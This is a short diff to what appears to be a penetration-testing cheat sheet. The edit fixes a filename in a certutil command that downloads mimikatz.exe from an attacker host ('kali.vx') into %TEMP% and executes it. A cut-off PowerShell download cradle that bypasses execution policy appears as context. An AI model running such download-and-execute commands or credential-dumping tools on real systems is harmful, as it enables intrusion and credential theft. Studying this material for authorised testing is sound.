@@ -120,7 +120,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Ne
 Option 2: certutil
 
 ```console
-certutil.exe /urlcache /f /split http://kali.vx/mimikatz.exe %TEMP%\reverse.exe && %TEMP%\mimikatz.exe
+certutil.exe /urlcache /f /split http://kali.vx/mimikatz.exe %TEMP%\mimikatz.exe && %TEMP%\mimikatz.exe
 ```
 
 **On Target:** mimikatz commands
